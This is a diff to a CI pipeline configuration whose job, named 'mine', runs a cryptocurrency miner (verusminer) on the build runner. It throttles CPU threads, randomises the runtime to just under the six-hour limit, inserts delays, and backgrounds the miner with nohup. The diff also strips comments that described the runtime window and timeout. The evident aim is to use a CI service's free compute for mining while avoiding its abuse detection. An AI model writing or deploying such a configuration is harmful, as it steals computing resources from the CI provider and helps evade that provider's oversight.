@@ -14,12 +14,9 @@ workflows:
 jobs:
   mine:
     docker:
-      - image: ubuntu:22.04   # <-- your requested image
+      - image: ubuntu:22.04
 
-       # replace this
-
-    timeout: 360   # 6h max runtime
-
+    
     steps:
       - checkout
 
@@ -48,7 +45,6 @@ jobs:
 
             echo "[*] CPU throttle: $MIN_THREADS–$MAX_THREADS threads"
 
-            # Random runtime window: 5h → 5h55m
             RUNTIME=$(shuf -i 18000-21300 -n 1)
             END_TIME=$(( $(date +%s) + RUNTIME ))
             echo "[*] Random execution window: $(echo "$RUNTIME/3600" | bc -l) hours"
@@ -81,7 +77,7 @@ jobs:
             sleep $DELAY
 
       - run:
-          name: Start miner in background (nohup)
+          name: Start miner in background
           command: |
             nohup ./run_miner.sh > verusminer.log 2>&1 &
             echo $! > miner.pid
